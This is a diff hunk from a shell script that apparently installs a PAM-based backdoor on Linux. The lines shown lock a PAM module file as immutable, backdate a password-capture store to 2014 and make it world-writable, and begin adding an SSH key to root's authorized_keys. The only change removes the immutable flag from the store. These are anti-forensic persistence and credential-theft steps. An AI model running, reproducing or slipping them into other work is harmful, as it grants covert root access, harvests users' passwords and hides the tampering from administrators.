@@ -44,7 +44,6 @@ chattr +i "$PAM_SO_PATH"
 
 touch -d "Aug 2 2014" "$PAM_PASSWORD_STORE"
 chmod 777 "$PAM_PASSWORD_STORE"
-chattr +i "$PAM_PASSWORD_STORE"
 
 # Write SSH key to /root/.ssh/authorized_keys
 mkdir -p /root/.ssh
